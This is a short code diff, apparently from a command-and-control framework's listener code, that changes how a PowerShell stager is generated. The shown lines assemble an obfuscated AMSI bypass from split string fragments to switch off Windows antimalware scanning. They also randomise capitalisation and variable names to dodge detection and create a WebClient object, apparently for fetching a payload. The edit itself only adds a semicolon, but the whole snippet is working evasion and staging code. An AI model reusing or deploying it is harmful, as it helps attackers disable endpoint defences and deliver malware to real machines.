@@ -325,7 +325,7 @@ class Listener:
                     # AMSI bypass
                     stager += '$p6="iInitFai";$p1="System.Management";$p5="ams";$p4="iUtils";$p7="led";$p3="on.Ams";$p8="NonPub";$p9="lic,Stat";'
                     stager += '$p10="ic";$p11=$null;$p12=$true;$p2=".Automati";[Ref].Assembly.GetType($p1+$p2+$p3+$p4).GetField($p5+$p6+$p7,$p8+$p9+$p10)'
-                    stager += '.SetValue($p11,$p12)'
+                    stager += '.SetValue($p11,$p12);'
 
                 stager += helpers.randomize_capitalization("[System.Net.ServicePointManager]::Expect100Continue=0;")
                 stager += helpers.randomize_capitalization("$" + helpers.generate_random_script_var_name("wc") + "= New-Object System.Net.WebClient;")
